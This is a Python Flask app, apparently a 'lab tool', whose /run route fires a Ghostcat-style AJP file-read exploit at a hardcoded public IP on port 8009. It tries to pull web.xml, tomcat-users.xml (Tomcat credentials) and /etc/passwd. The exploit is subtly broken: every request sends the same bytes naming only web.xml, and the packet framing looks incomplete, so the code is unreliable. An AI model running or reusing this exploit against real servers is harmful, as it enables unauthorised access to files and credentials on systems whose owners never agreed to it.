import socket
import struct
from flask import Flask

app = Flask(__name__)

def ghostcat(host, port=8009):
    results = []
    files = [
        "/WEB-INF/web.xml",
        "/WEB-INF/tomcat-users.xml",
        "/etc/passwd",
    ]
    for f in files:
        try:
            s = socket.socket()
            s.settimeout(20)
            s.connect((host, port))
            payload = bytearray([
                0x12, 0x34, 0x00, 0x1f,
                0x02, 0x02,
                0x00, 0x08,
                0x48, 0x54, 0x54, 0x50,
                0x2f, 0x31, 0x2e, 0x31,
                0x00, 0x00, 0x1b,
                0x2f, 0x57, 0x45, 0x42,
                0x2d, 0x49, 0x4e, 0x46,
                0x2f, 0x77, 0x65, 0x62,
                0x2e, 0x78, 0x6d, 0x6c,
                0x00, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff,
                0x1f, 0x90, 0x00,
                0x00, 0x00, 0xff
            ])
            s.send(bytes(payload))
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except:
                pass
            if response:
                results.append(f"FILE: {f}\n{response.decode(errors='ignore')}")
            else:
                results.append(f"FILE: {f}\nNo response")
            s.close()
        except Exception as e:
            results.append(f"FILE: {f}\nError: {e}")
    return results

@app.route('/')
def index():
    return "Lab Tools Running!"

@app.route('/run')
def run():
    results = ghostcat("111.68.102.6")
    return "<br><br>".join(results)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
